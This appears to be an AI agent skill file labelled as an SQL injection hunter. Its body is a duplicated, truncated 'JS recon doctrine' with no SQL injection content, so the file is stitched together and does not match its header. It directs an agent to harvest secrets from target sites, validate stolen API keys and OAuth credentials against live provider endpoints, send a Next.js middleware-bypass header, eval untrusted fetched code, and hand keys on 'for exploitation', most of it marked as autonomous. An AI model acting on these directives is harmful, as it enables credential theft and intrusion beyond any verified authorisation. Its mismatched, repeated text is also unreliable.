---
name: sqli-hunter-agent
description: >
  Elite SQL Injection hunting agent for bug bounty, CTF, pentests — web, Android, and API.
  ALWAYS activate for: SQL injection, SQLi, NoSQL injection, blind SQLi, time-based SQLi, error-based SQLi, second-order SQLi, auth bypass via SQL, UNION injection, OOB SQLi, MongoDB injection, WAF bypass for SQLi, sqlmap, ghauri, GraphQL SQLi, API SQLi, Android SQLi, ORM injection, stacked queries, DBMS fingerprinting, boolean-based blind, ORDER BY injection, SQLi chaining, or ANY request to find/test/exploit SQL-family injection vulnerabilities. Covers full kill chain: recon → surface mapping → DBMS fingerprint → payload escalation → WAF bypass → exploit → PoC → report. False-positive aware. Token-efficient. Never skips manual fingerprinting. 20+ year veteran mindset.
---

<!-- MANDATORY-JS-RECON-DOCTRINE v3 — injected across EVERY skill. Do not delete or gate behind a condition. -->

# 🚨 MANDATORY JS RECON GATE — NO SKIP, NO EXCEPTIONS

**This block is law in every skill.** Whatever else this skill does, if a web/HTTP target is
anywhere in scope you MUST complete the JS recon pipeline below BEFORE you conclude recon,
rank surface, declare "nothing found," or move to the next phase. Skipping any step is a
**process failure, not an optimization.** There is no file-count exception, no time-pressure
exception, no "it's a small app / SPA / static site" exception.

> Client-side JS is the attack-surface map of the entire application. Every bundle, chunk,
> worker, source map, service worker, and inline script leaks endpoints, secrets, roles,
> feature flags, and business logic the server never meant you to see. Hunters who skip JS lose the P1s.

---

## RULE 1 — ALL crawlers are MANDATORY on EVERY live host — plus 3 new mandatory classes

Run **all five** tool-classes — never just one, never "pick your favourite." Enumerate subdomains
first, then run this per host (each subdomain ships its own bundle, secrets, and logic):

```bash
subfinder -d "$T" -all -silent | httpx -silent -mc 200 -o live_hosts.txt   # per-host, not per-apex

# PASSIVE (zero-touch history — catches dead/forgotten/rotated-but-still-live JS)
echo "$HOST" | waybackurls | anew all_urls.txt
echo "$HOST" | gau --subs  | anew all_urls.txt
echo "$HOST" | waymore -mode U -oU waymore.txt 2>/dev/null; cat waymore.txt | anew all_urls.txt
awk '/\.js([?]|$)/' all_urls.txt | anew js.txt

# ACTIVE (live DOM, dynamic <script>, chunk loads)
katana   -u "https://$HOST" -jc -jsl -d 5 -kf all -aff -silent | anew all_urls.txt
hakrawler -u "https://$HOST" -d 3 -subs 2>/dev/null              | anew all_urls.txt
gospider  -s "https://$HOST" -d 3 --js  2>/dev/null              | anew all_urls.txt
cariddi   -s "https://$HOST" -intensive 2>/dev/null | grep '\.js'| anew js.txt
awk '/\.js([?]|$)/' all_urls.txt | anew js.txt

# MANDATORY: Service Workers (often forgotten, contain cache logic + secrets)
curl -sL "https://$HOST/sw.js"              -o "js_files/sw.js"              2>/dev/null
curl -sL "https://$HOST/service-worker.js"  -o "js_files/service-worker.js"  2>/dev/null
curl -sL "https://$HOST/manifest.json" | jq -r '.service_worker // empty'   2>/dev/null
# Check Web App Manifest for SW registration path and parse its scope

# MANDATORY: Inline JS extraction from every HTML page (tools miss embedded <script> blocks)
python3 - <<'PYEOF'
import re, sys, requests
from bs4 import BeautifulSoup
HOST = sys.argv[1] if len(sys.argv)>1 else ""
for path in ['/', '/app', '/dashboard', '/admin', '/login']:
    try:
        r = requests.get(f"https://{HOST}{path}", timeout=10,
                         headers={"User-Agent":"Mozilla/5.0"})
        soup = BeautifulSoup(r.text, 'html.parser')
        for i, tag in enumerate(soup.find_all('script', src=False)):
            if tag.string and len(tag.string) > 100:
                fname = f"js_files/inline_{path.strip('/') or 'root'}_{i}.js"
                open(fname,'w').write(tag.string)
                print(f"[INLINE] {fname} ({len(tag.string)} chars)")
        # Also capture window.__NEXT_DATA__, window.__NUXT__, window.__remixContext
        for pat in [r'window\.__NEXT_DATA__\s*=\s*({.+?});',
                    r'window\.__NUXT__\s*=\s*(.+?)\s*;',
                    r'window\.__remixContext\s*=\s*({.+?});']:
            m = re.search(pat, r.text, re.DOTALL)
            if m: print(f"[SSR-STATE] {pat[:20]}... FOUND at {HOST}{path}")
    except: pass
PYEOF

# MANDATORY: Framework-specific chunk paths (lazy bundles tools never trigger)
# Next.js
curl -s "https://$HOST/_next/static/chunks/pages/_app.js" | head -5 | grep -q 'function' && \
  echo "[NEXT.JS] _next/ chunks present" && \
  katana -u "https://$HOST" -d 3 -silent | grep '_next/static' | anew js.txt
# Nuxt
curl -s "https://$HOST/_nuxt/" -o /dev/null -w "%{http_code}" | grep -q 200 && \
  echo "[NUXT] _nuxt/ chunks present"
# Vite
curl -s "https://$HOST/assets/" -o /dev/null -w "%{http_code}" | grep -q 200 && \
  echo "[VITE] /assets/ present"
```

**MANUAL CRAWL is equally mandatory — tools miss auth-gated and lazy-loaded routes:**
- Open the app in a real browser with **Burp/mitmproxy inline**. **Log in.**
- Click through **every** route, tab, modal, multi-step wizard, settings/admin area.
- Watch the Network panel: every `.js`, every XHR/fetch, every WebSocket frame, every chunk
  pulled on navigation goes into `js.txt` / the endpoint list. SPAs load chunks lazily — a
  route you never visited = a bundle you never saw = bugs you never found.
- Toggle every feature flag you can find and capture the JS that loads behind each one.
- Burp extensions **JS Miner** + **Param Miner** + **JS Link Finder** run passively — enable all three.
- **In DevTools → Application tab:** check Service Workers registered, Cache Storage entries
  (cached JS/API responses), and Local Storage / Session Storage for tokens and flags.
- **In DevTools → Sources tab:** look for webpack internal entries (`webpack://`) and
  source-mapped originals — these are readable even without fetching `.map` separately.

---

## RULE 2 — Recover, beautify, DEOBFUSCATE, and READ every file (never grep-only)

```bash
sort -u js.txt -o js.txt && mkdir -p js_files beautified recovered deobfuscated
xargs -a js.txt -P20 -I@ sh -c 'curl -sL -A "Mozilla/5.0" "@" -o "js_files/$(echo @ | md5sum | cut -c1-16).js"'
for f in js_files/*.js; do js-beautify "$f" > "beautified/$(basename "$f")"; done

# SOURCE MAPS = full original source (readable, real var names, internal paths). A 200 is game over.
while read u; do
  s=$(curl -so /dev/null -w "%{http_code}" "$u.map")
  [ "$s" = "200" ] && echo "$u.map"
done < js.txt | tee sourcemaps_found.txt
# Recover each: sourcemapper -url URL -output ./recovered/   OR  unwebpack  OR  webcrack
# For multiple: cat sourcemaps_found.txt | xargs -I@ sourcemapper -url "@" -output ./recovered/

# WEBPACK DEOBFUSCATION — webcrack handles packed/self-executing bundles and recovers modules
# Install: npm install -g webcrack
for f in beautified/*.js; do
  webcrack "$f" -o "deobfuscated/$(basename "$f" .js)/" 2>/dev/null && \
    echo "[WEBCRACK] deobfuscated: $f"
done

# OBFUSCATOR.IO / eval-packed code — detect and unwrap
grep -l 'eval(function(p,a,c,k,e,d)' beautified/*.js | while read f; do
  node -e "var x=$(cat $f); if(typeof x==='string') console.log(x)" > "deobfuscated/$(basename $f)" 2>/dev/null
done
# String array rotation / hex strings
grep -l 'String\["fromCharCode"\]\|\\x[0-9a-f]\{2\}' beautified/*.js | \
  xargs -I@ sh -c 'node -e "eval(require(\"fs\").readFileSync(\"@\",\"utf8\"))" 2>/dev/null > deobfuscated/$(basename @)'

# WEBPACK: pull the runtime bootstrap's chunk-id→hash map to enumerate LAZY chunks no crawler triggered
grep -oE '[0-9]+:"[0-9a-f]{6,}"' beautified/*runtime* beautified/*.js 2>/dev/null | head -100
# Reconstruct chunk URLs: <publicPath>/<chunkId>.<hash>.chunk.js and fetch each
# Next.js chunks: /_next/static/chunks/<id>.<hash>.js
# Vite chunks: /assets/<name>.<hash>.js
```

**Grep is a triage pass to prioritize — NEVER the analysis itself.** Grep finds `apikey` and
`fetch(`. It does not tell you a URL-upload feature silently proxies server-side (SSRF), or that
a role flag is set client-side and never re-checked. **Every beautified/deobfuscated file gets
read end to end, including service workers and inline scripts.** No exception — budget the time;
this step is supposed to be slow.

---

## RULE 3 — Hunt these in every file (the money list — v2 expanded)

Static-scan to triage, then READ to confirm. Scanners: `trufflehog filesystem js_files/`
(verifies live keys), `jsluice urls|secrets js_files/*.js`, `mantra -f js.txt`,
`SecretFinder -i <f> -o cli`, `LinkFinder -i beautified/ -o cli`, `xnLinkFinder`,
`nuclei -t http/exposures/ -l js.txt`, `retire.js --js`, `whispers --target js_files/`.

### Secrets / Tokens (expanded — AI era + SaaS full coverage)

**Cloud & Infrastructure**
- **AWS** `AKIA…` access key + `aws_secret` 40-char key
- **GCP** `AIza[0-9A-Za-z\-_]{35}` + service-account JSON blob (`"type":"service_account"`)
- **Azure** storage connection strings `DefaultEndpointsProtocol=https;AccountName=...;AccountKey=...`; SAS tokens `?sv=`; tenant ID + `client_secret` in MSAL/ADAL config blocks
- **Databricks** `dapi[a-zA-Z0-9]{32}`
- **Snowflake** `account=...;user=...;password=...` in connection strings
- **MongoDB Atlas** `mongodb+srv://user:pass@cluster`
- **Redis** `redis://:password@host:port`
- **SMTP** `smtp://user:pass@host` in nodemailer/transporter configs
- **PEM private keys** `-----BEGIN (RSA |EC )?PRIVATE KEY-----`

**AI / ML Providers**
- **OpenAI** `sk-[A-Za-z0-9]{48}` and project keys `sk-proj-[A-Za-z0-9_\-]{48,}`
- **Anthropic** `sk-ant-[A-Za-z0-9\-_]{95,}` — full Claude API key
- **HuggingFace** `hf_[A-Za-z0-9]{34,}` — model download + write access
- **Replicate** `r8_[A-Za-z0-9]{40}`
- **Groq** `gsk_[A-Za-z0-9]{52}`
- **Cohere** `[A-Za-z0-9]{40}` with `cohere`/`CO_API_KEY` context
- **Together.ai** `[A-Za-z0-9]{40}` with `together`/`TOGETHER_API_KEY` context
- **Mistral** `[A-Za-z0-9]{32}` with `mistral`/`MISTRAL_API_KEY` context
- **Perplexity** `pplx-[A-Za-z0-9]{48}`
- **Pinecone** API key in vector DB init (`new Pinecone({ apiKey: … })`)
- **Voyage AI** `pa-[A-Za-z0-9]{40}`

**Payments & Finance**
- **Stripe** `sk_live_[0-9a-zA-Z]{24,}` / `sk_test_…`; webhook secret `whsec_[A-Za-z0-9]{32,}`
- **Braintree** `access_token$production$[A-Za-z0-9]{32}`
- **Square** `sq0atp-[A-Za-z0-9_\-]{22}` (access) / `sq0csp-[A-Za-z0-9_\-]{22}` (client secret)
- **Plaid** `client_id` + `secret` in PlaidLink init config
- **PayPal** `client_id` + `client_secret` in SDK init

**Communication & Messaging**
- **Twilio** `AC[a-zA-Z0-9]{32}` Account SID + `SK[a-z0-9]{32}` Auth Token
- **SendGrid** `SG.[A-Za-z0-9_\-]{22}.[A-Za-z0-9_\-]{43}`
- **Mailgun** `key-[a-zA-Z0-9]{32}`
- **Mailchimp** `[a-zA-Z0-9]{32}-us[0-9]{1,2}`
- **Slack** `xox[baprs]-…` / webhook `hooks.slack.com/services/…`
- **Discord bot** `[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}`
- **Telegram bot** `[0-9]+:AAF[a-zA-Z0-9_-]{33}`
- **Pusher** `app_key` + `app_secret` + cluster inline in Pusher JS init

**Developer & SaaS Platforms**
- **GitHub** `ghp_[A-Za-z0-9]{36}` / `github_pat_[A-Za-z0-9_]{82}`; webhook secret `sha256=` signing key
- **Vercel** `vc_[A-Za-z0-9]{32,}` / `VERCEL_TOKEN`
- **Netlify** `netlify-[A-Za-z0-9\-_]{40}`
- **Shopify** `shpss_[A-Za-z0-9]{32}` / `shpat_[A-Za-z0-9]{32}`; webhook HMAC secret
- **Algolia admin key** `[A-Za-z0-9]{32}` with `adminApiKey` label
- **Mapbox** `sk.[A-Za-z0-9]{80,}`
- **Datadog** `DD_API_KEY` / `datadog-[A-Za-z0-9]{32}`
- **Intercom** `[A-Za-z0-9]{8}-[A-Za-z0-9]{4}-…` with `intercom` context
- **Okta** `SSWS [A-Za-z0-9]{42}` API token
- **Auth0** `client_secret` in SPA SDK init; management API token `v2/…`
- **New Relic** `NRAK-[A-Za-z0-9]{27}` license key
- **Sentry DSN** `https://[key]@[org].ingest.sentry.io/[id]` — reveals org, project, DSN secret
- **LaunchDarkly** `sdk-[A-Za-z0-9\-]{40}` server-side key (write access to flags)
- **Segment** write key `[A-Za-z0-9]{32}` with `analytics.load(` context

**Auth & Crypto**
- **JWTs** `eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}`
- **Basic auth blobs** `Authorization: Basic [A-Za-z0-9+/=]{20,}`
- **OAuth** `client_id` + `client_secret` pairs
- **Apple APNs** `.p8` private key + Team ID + Key ID in push notification config

**Firebase / Supabase / Realtime DBs**
- **Firebase config object** `apiKey`, `authDomain`, `projectId`, `storageBucket`, `messagingSenderId`, `appId` — reveals project, enables unauth REST probing even if the key itself is "public"
- **Supabase** `SUPABASE_ANON_KEY` / `SUPABASE_SERVICE_ROLE_KEY` (service role = full DB access)

**Cloudinary**
- `cloudinary://[api_key]:[api_secret]@cloud_name` in upload preset config

**WebRTC**
- `iceServers` config with `urls: turn:...` + `username` + `credential` — TURN server credentials, test for reuse

### Hidden / Internal / Staging Endpoints
Every endpoint in JS is an UNTESTED endpoint. Real payout pattern: `/api/v2/internal/users`
recovered from obfuscated JS → full user DB → $25k. Also hunt:
- **WebSocket/SSE** `ws://`, `wss://`, `/subscribe`, `/stream`, `/sse`, `/events` — WS endpoints
  skip HTTP auth middleware and are frequently unprotected
- **GraphQL subscriptions** `subscription {`, `/subscriptions`, `/graphql-ws`
- **Deprecated v1 APIs** when v2 added auth — the old version often still runs
- **`window.__NEXT_DATA__`** — Next.js SSR embeds server-side API responses verbatim in HTML;
  often contains auth tokens, session data, internal API base URLs, and user PII
- **`window.__NUXT__`** — same problem on Nuxt apps
- **`window.__remixContext`** — Remix loader data embedded in HTML

### Critical Architecture & Logic Findings (only readable, not greppable)

These are the findings that separate JS readers from JS greppers. No scanner catches these — you find them only by understanding the code.

**Internal attack surface expansion**
- Internal microservice URLs (`http://internal-api/`, `http://10.x.x.x/`, `grpc://`) → direct SSRF targets not reachable from outside
- Shadow API versions: `v0`, `beta`, `internal`, `legacy` paths referenced in code but absent from docs — old version often has no auth
- Admin/ops routes (`/admin`, `/internal`, `/ops`, `/debug`) with comments revealing auth requirements (or lack of)
- Lambda function URLs, API Gateway stage variables, Cloud Function names → direct invocation bypassing WAF/rate limit
- S3/GCS/Azure blob container names in upload/download logic → enumerate + test ACL misconfig
- gRPC service + method names → probe for exposed gRPC-web endpoints without auth
- Cloud account IDs, project IDs, tenant IDs → enumerate cross-tenant

**Auth & authz logic that breaks server-side**
- Client-side role checks (`if (user.role === 'admin')`) → call the endpoint directly with low-priv token; server may never re-validate → BFLA
- Feature flags controlling security controls (`if (flags.skipRateLimit)`, `if (!flags.enforceAuth)`) → send overridden flag value in request/cookie
- Environment detection: `if (process.env.NODE_ENV !== 'production') { skip2FA() }` → probe if staging logic bleeds into prod headers
- Multi-tenant switching: how `org_id`/`tenant_id` is set client-side → test with another tenant's ID → horizontal escalation
- Permission bitmask definitions client-side → craft value that grants escalated bits
- A/B test variant code that unlocks privileged UI or unguarded endpoints for a subset of users

**Business logic & price manipulation**
- Price, discount, shipping, tax calculation done client-side → send manipulated values directly to order endpoint
- Promo/referral/coupon code generation patterns → predictable? Brute-forceable?
- Payment flow state machine definition → identify step-skip to complete order without payment leg
- Quantity / negative-value handling in cart logic → test negative quantities for credit

**Token & crypto weaknesses (read the generation code)**
- Token generation using `Math.random()`, `Date.now()`, or short entropy → predictable; reproduce offline
- Client-side encryption with hardcoded IV or key → decrypt intercepted traffic offline
- Password hashing revealed: `md5(pass + salt)`, `sha1(pass)` → crack offline
- HMAC signing with client-visible secret → forge arbitrary signed requests
- JWT construction showing which claims are client-set and which the server skips validating

**Injection hints buried in logic**
- SQL fragments in ORM calls: `db.raw(userInput)`, `knex.raw(…)`, `sequelize.query(userInput)` → direct SQLi target
- GraphQL query/mutation definitions → identify sensitive fields, hidden resolvers not in introspection
- Template strings fed to eval or innerHTML: `` eval(`SELECT ${input}`) `` → confirmed injection sink
- Regex input validation patterns → find gaps, edge cases, Unicode bypasses

**CORS / postMessage / redirect bypass hints**
- `allowedOrigins` array → find weakest entry (wildcard subdomain? `null` origin accepted?)
- postMessage handler: `event.data[action]()` or `window[event.data.fn]()` without `event.origin` check → XSS pivot from any frame
- Redirect whitelist using `startsWith`: `url.startsWith('https://company.com')` → bypass with `https://company.com.evil.com`
- CORS logic: `if (allowedOrigins.includes(req.headers.origin))` — test `null` origin, `Origin: ` (empty)

**Recon amplifiers (fingerprint hidden features)**
- Analytics event names (`track('admin_panel_viewed')`) → enumerate hidden features/flows not linked in nav
- Error handler stack traces → reveals internal file paths, framework versions, DB query structure
- `console.log` / `console.debug` statements left in prod → tokens, IDs, internal state dumped to DevTools

### Client-Side Auth & Roles
`isAdmin`, `role === 'admin'`, `hasPermission`, `parseJwt`, `atob(token)`,
`localStorage.setItem('admin',…)`, `featureFlags`, `canAccess`, `tier === 'enterprise'`.
Any UI/route gated ONLY client-side → call the endpoint directly with a low-priv token.

### Hidden Routes & Feature Flags
Dump SPA router table (React Router / Vue Router / Angular / Next.js pages directory).
Visit admin/beta/internal routes the nav never links. Flip feature flags (`localStorage`,
`?feature=`, cookie, JSON config, LaunchDarkly/Statsig/Split client keys) to unlock
ungated functionality.

### DOM XSS Sinks
`innerHTML`, `outerHTML`, `document.write`, `eval`, `new Function`, `setTimeout("…")`,
jQuery `$()`, `.html()`, `dangerouslySetInnerHTML`, `v-html`, Angular `bypassSecurityTrustHtml`;
sources `location.hash/search/href`, `postMessage`, `document.referrer`, `window.name` → trace source→sink.

### Prototype Pollution
`__proto__`, unsafe `merge/extend/Object.assign(x.prototype…)`, query-string parsers,
`qs.parse`/`querystring.parse` feeding into merge → gadget chain to XSS/RCE.

### Cloud & 3rd-party Refs
`*.amazonaws.com`/`s3://`, `firebaseio.com`, `storage.googleapis.com`,
`*.blob.core.windows.net`, `cloudfront.net`, `*.digitaloceanspaces.com`,
`supabase.co`, `*.neon.tech`, `*.planetscale.com` → test misconfig + takeover.

### postMessage Without Origin Check
`addEventListener('message',…)` with no `e.origin` check → cross-origin data theft / DOM XSS.

### Dependency CVEs
Map bundled lib versions to OSV/Snyk (`retire.js`). One bundled vulnerable lodash / axios /
DOMPurify / jQuery / Next.js = your bug. **2025 critical:** Next.js CVE-2025-29927
(middleware auth bypass via `x-middleware-subrequest` header — any Next.js ≤ 15.2.2).

### Historical / Version Diffing
Pull OLD JS from Wayback, diff vs live. Secrets and endpoints "removed" from current JS are
frequently STILL LIVE server-side; forgotten APIs survive in old bundles.

### Obfuscation as a Red Flag
Heavy obfuscation (`eval(function(p,a,c,k,e,d)`, string arrays, hex strings, `_0x` var names)
signals the developer was trying to hide something. Deobfuscate with `webcrack` / `synchrony` /
`de4js` and READ — the payoff rate on obfuscated code is higher than on readable code.

---

## RULE 4 — Confirm dynamically, THEN it's a finding (kill false positives)

Nothing gets reported on a regex hit alone. Prove it live:
- **OAuth client creds** → mint a real token:
  `curl -sX POST https://apigw.$T/token -H "Authorization: Basic <BLOB>" -d grant_type=client_credentials`
  → `access_token` returned = confirmed High/Crit (can't rotate without breaking prod).
- **AI API key** → call the provider's identity/model-list endpoint:
  `curl -s https://api.openai.com/v1/models -H "Authorization: Bearer $KEY"` → 200 = live.
  `curl -s https://api.anthropic.com/v1/models -H "x-api-key: $KEY" -H "anthropic-version: 2023-06-01"` → 200 = live.
- **`window.__NEXT_DATA__`** → curl the page without JS (`curl -sL https://HOST/page`) and
  parse the JSON blob from the HTML — if it contains session tokens or user PII, that's a finding.
- **"Internal" endpoint** → hit it unauth / cross-tenant and diff the response.
- **Params from JS** → fuzz `debug=true`, `admin=1`, `callback=`, `redirect=` and JS-seeded names
  (`x8` / `Arjun` from bundle var names) against the endpoints they belong to.
- **DOM XSS** → drive source→sink in real headless Chrome (Playwright preferred over Selenium);
  screenshot the alert/exfil.
- **WebSocket endpoint** → connect with `wscat`/`websocat` without auth header; send a probe message.
- **Next.js middleware bypass** → add `x-middleware-subrequest: middleware:middleware:middleware`
  header to any request behind a Next.js middleware guard; 200/data = CVE-2025-29927 confirmed.
- Feed confirmed secret keys to the **jsmax** skill for exploitation; DOM-XSS / prototype-pollution
  gadgets to the **xss-hunter-agent** skill for payload crafting.

- **Race condition** → fire 20+ parallel requests simultaneously (curl `--parallel` / Python asyncio+aiohttp / Playwright multi-context); confirm with: multiple `200 OK` on one-time-use action, duplicate records, balance goes negative, two success responses for a single-use token. Build the script fresh per target — timing constraints differ per app.
- **Secret new patterns** → confirm with provider identity endpoint: Twilio `api.twilio.com/2010-04-01/Accounts/$SID.json` (Basic auth); Stripe `/v1/account`; Mailgun `/v3/domains`; Discord `/api/v10/users/@me`; Telegram `api.telegram.org/bot$TOKEN/getMe`; Databricks `/api/2.0/token/list`; Supabase service role → `supabase.co/rest/v1/` with `apikey:` header (returns full table data = confirmed)
- **Business logic / price manipulation** → capture the POST body, modify the price/quantity field, replay with curl; confirm server used the client value in response total
- **Internal URL SSRF** → hit it via a server-side parameter that makes the app fetch a URL; confirm with `interactsh` callback or timing difference
- **Multi-tenant ID swap** → repeat the request with a different org/tenant ID; confirm data returned belongs to the other tenant

**Only then write the report.** No "could potentially" — prove it or drop it.

---

## CAPABILITY MAP — what runs autonomously vs. needs human

| Finding class | Autonomous (find + PoC + confirm) | Notes |
|---|---|---|
| Secret in JS | ✅ Full | grep → curl identity endpoint → confirmed |
| Unauth API endpoint | ✅ Full | curl without auth → check data returned |
| CORS bypass | ✅ Full | curl with crafted Origin header |
| SSRF via internal URL | ✅ Full | curl + interactsh callback |
| JWT attack (alg:none, claim tamper) | ✅ Full | craft JWT → curl |
| GraphQL introspection + BOLA | ✅ Full | full query chain |
| Price / business logic manipulation | ✅ Full | modified POST body via curl |
| Redirect bypass | ✅ Full | curl -L with crafted URL |
| Feature flag abuse | ✅ Full | send overridden flag value |
| S3/GCS/Firebase unauth | ✅ Full | aws s3 ls / curl REST |
| Race condition | ✅ Full | curl --parallel / asyncio / Playwright multi-context (script built fresh per target) |
| DOM-XSS | ⚠️ Script provided | Drive with claude-in-chrome or Playwright — needs browser session |
| postMessage XSS | ⚠️ Script provided | Write exploit HTML; user loads it |
| Auth flow logic bugs | ⚠️ Needs session | Requires authenticated cookies/tokens from user |
| CAPTCHA-gated flows | 🚫 Human-in-loop | Firm boundary — user solves, automation continues |
| MFA bypass | 🚫 Needs real device | Requires live TOTP/SMS |
| Client-side crypto weakness | 🔍 Identify + explain | Code identified, math worked through manually |
| Deobfuscation | ⚠️ Tool-dependent | Requires webcrack/synchrony installed; check first |
| Prototype pollution | ⚠️ Script provided | Find sink + write PoC; browser execution needed |

---


<!-- MANDATORY-JS-RECON-DOCTRINE v2 — injected across EVERY skill. Do not delete or gate behind a condition. -->

# 🚨 MANDATORY JS RECON GATE — NO SKIP, NO EXCEPTIONS

**This block is law in every skill.** Whatever else this skill does, if a web/HTTP target is
anywhere in scope you MUST complete the JS recon pipeline below BEFORE you conclude recon,
rank surface, declare "nothing found," or move to the next phase. Skipping any step is a
**process failure, not an optimization.** There is no file-count exception, no time-pressure
exception, no "it's a small app / SPA / static site" exception.

> Client-side JS is the attack-surface map of the entire application. Every bundle, chunk,
> worker, source map, service worker, and inline script leaks endpoints, secrets, roles,
> feature flags, and business logic the server never meant you to see. Hunters who skip JS lose the P1s.

---

## RULE 1 — ALL crawlers are MANDATORY on EVERY live host — plus 3 new mandatory classes

Run **all five** tool-classes — never just one, never "pick your favourite." Enumerate subdomains
first, then run this per host (each subdomain ships its own bundle, secrets, and logic):

```bash
subfinder -d "$T" -all -silent | httpx -silent -mc 200 -o live_hosts.txt   # per-host, not per-apex

# PASSIVE (zero-touch history — catches dead/forgotten/rotated-but-still-live JS)
echo "$HOST" | waybackurls | anew all_urls.txt
echo "$HOST" | gau --subs  | anew all_urls.txt
echo "$HOST" | waymore -mode U -oU waymore.txt 2>/dev/null; cat waymore.txt | anew all_urls.txt
awk '/\.js([?]|$)/' all_urls.txt | anew js.txt

# ACTIVE (live DOM, dynamic <script>, chunk loads)
katana   -u "https://$HOST" -jc -jsl -d 5 -kf all -aff -silent | anew all_urls.txt
hakrawler -u "https://$HOST" -d 3 -subs 2>/dev/null              | anew all_urls.txt
gospider  -s "https://$HOST" -d 3 --js  2>/dev/null              | anew all_urls.txt
cariddi   -s "https://$HOST" -intensive 2>/dev/null | grep '\.js'| anew js.txt
awk '/\.js([?]|$)/' all_urls.txt | anew js.txt

# MANDATORY: Service Workers (often forgotten, contain cache logic + secrets)
curl -sL "https://$HOST/sw.js"              -o "js_files/sw.js"              2>/dev/null
curl -sL "https://$HOST/service-worker.js"  -o "js_files/service-worker.js"  2>/dev/null
curl -sL "https://$HOST/manifest.json" | jq -r '.service_worker // empty'   2>/dev/null
# Check Web App Manifest for SW registration path and parse its scope

# MANDATORY: Inline JS extraction from every HTML page (tools miss embedded <script> blocks)
python3 - <<'PYEOF'
import re, sys, requests
from bs4 import BeautifulSoup
HOST = sys.argv[1] if len(sys.argv)>1 else ""
for path in ['/', '/app', '/dashboard', '/admin', '/login']:
    try:
        r = requests.get(f"https://{HOST}{path}", timeout=10,
                         headers={"User-Agent":"Mozilla/5.0"})
        soup = BeautifulSoup(r.text, 'html.parser')
        for i, tag in enumerate(soup.find_all('script', src=False)):
            if tag.string and len(tag.string) > 100:
                fname = f"js_files/inline_{path.strip('/') or 'root'}_{i}.js"
                open(fname,'w').write(tag.string)
                print(f"[INLINE] {fname} ({len(tag.string)} chars)")
        # Also capture window.__NEXT_DATA__, window.__NUXT__, window.__remixContext
        for pat in [r'window\.__NEXT_DATA__\s*=\s*({.+?});',
                    r'window\.__NUXT__\s*=\s*(.+?)\s*;',
                    r'window\.__remixContext\s*=\s*({.+?});']:
            m = re.search(pat, r.text, re.DOTALL)
            if m: print(f"[SSR-STATE] {pat[:20]}... FOUND at {HOST}{path}")
    except: pass
PYEOF

# MANDATORY: Framework-specific chunk paths (lazy bundles tools never trigger)
# Next.js
curl -s "https://$HOST/_next/static/chunks/pages/_app.js" | head -5 | grep -q 'function' && \
  echo "[NEXT.JS] _next/ chunks present" && \
  katana -u "https://$HOST" -d 3 -silent | grep '_next/static' | anew js.txt
# Nuxt
curl -s "https://$HOST/_nuxt/" -o /dev/null -w "%{http_code}" | grep -q 200 && \
  echo "[NUXT] _nuxt/ chunks present"
# Vite
curl -s "https://$HOST/assets/" -o /dev/null -w "%{http_code}" | grep -q 200 && \
  echo "[VITE] /assets/ present"
```

**MANUAL CRAWL is equally mandatory — tools miss auth-gated and lazy-loaded routes:**
- Open the app in a real browser with **Burp/mitmproxy inline**. **Log in.**
- Click through **every** route, tab, modal, multi-step wizard, settings/admin area.
- Watch the Network panel: every `.js`, every XHR/fetch, every WebSocket frame, every chunk
  pulled on navigation goes into `js.txt` / the endpoint list. SPAs load chunks lazily — a
  route you never visited = a bundle you never saw = bugs you never found.
- Toggle every feature flag you can find and capture the JS that loads behind each one.
- Burp extensions **JS Miner** + **Param Miner** + **JS Link Finder** run passively — enable all three.
- **In DevTools → Application tab:** check Service Workers registered, Cache Storage entries
  (cached JS/API responses), and Local Storage / Session Storage for tokens and flags.
- **In DevTools → Sources tab:** look for webpack internal entries (`webpack://`) and
  source-mapped originals — these are readable even without fetching `.map` separately.

---

## RULE 2 — Recover, beautify, DEOBFUSCATE, and READ every file (never grep-only)

```bash
sort -u js.txt -o js.txt && mkdir -p js_files beautified recovered deobfuscated
xargs -a js.txt -P20 -I@ sh -c 'curl -sL -A "Mozilla/5.0" "@" -o "js_files/$(echo @ | md5sum | cut -c1-16).js"'
for f in js_files/*.js; do js-beautify "$f" > "beautified/$(basename "$f")"; done

# SOURCE MAPS = full original source (readable, real var names, internal paths). A 200 is game over.
while read u; do
  s=$(curl -so /dev/null -w "%{http_code}" "$u.map")
  [ "$s" = "200" ] && echo "$u.map"
done < js.txt | tee sourcemaps_found.txt
# Recover each: sourcemapper -url URL -output ./recovered/   OR  unwebpack  OR  webcrack
# For multiple: cat sourcemaps_found.txt | xargs -I@ sourcemapper -url "@" -output ./recovered/

# WEBPACK DEOBFUSCATION — webcrack handles packed/self-executing bundles and recovers modules
# Install: npm install -g webcrack
for f in beautified/*.js; do
  webcrack "$f" -o "deobfuscated/$(basename "$f" .js)/" 2>/dev/null && \
    echo "[WEBCRACK] deobfuscated: $f"
done

# OBFUSCATOR.IO / eval-packed code — detect and unwrap
grep -l 'eval(function(p,a,c,k,e,d)' beautified/*.js | while read f; do
  node -e "var x=$(cat $f); if(typeof x==='string') console.log(x)" > "deobfuscated/$(basename $f)" 2>/dev/null
done
# String array rotation / hex strings
grep -l 'String\["fromCharCode"\]\|\\x[0-9a-f]\{2\}' beautified/*.js | \
  xargs -I@ sh -c 'node -e "eval(require(\"fs\").readFileSync(\"@\",\"utf8\"))" 2>/dev/null > deobfuscated/$(basename @)'

# WEBPACK: pull the runtime bootstrap's chunk-id→hash map to enumerate LAZY chunks no crawler triggered
grep -oE '[0-9]+:"[0-9a-f]{6,}"' beautified/*runtime* beautified/*.js 2>/dev/null | head -100
# Reconstruct chunk URLs: <publicPath>/<chunkId>.<hash>.chunk.js and fetch each
# Next.js chunks: /_next/static/chunks/<id>.<hash>.js
# Vite chunks: /assets/<name>.<hash>.js
```

**Grep is a triage pass to prioritize — NEVER the analysis itself.** Grep finds `apikey` and
`fetch(`. It does not tell you a URL-upload feature silently proxies server-side (SSRF), or that
a role flag is set client-side and never re-checked. **Every beautified/deobfuscated file gets
read end to end, including service workers and inline scripts.** No exception — budget the time;
this step is supposed to be slow.

---

## RULE 3 — Hunt these in every file (the money list — v2 expanded)

Static-scan to triage, then READ to confirm. Scanners: `trufflehog filesystem js_files/`
(verifies live keys), `jsluice urls|secrets js_files/*.js`, `mantra -f js.txt`,
`SecretFinder -i <f> -o cli`, `LinkFinder -i beautified/ -o cli`, `xnLinkFinder`,
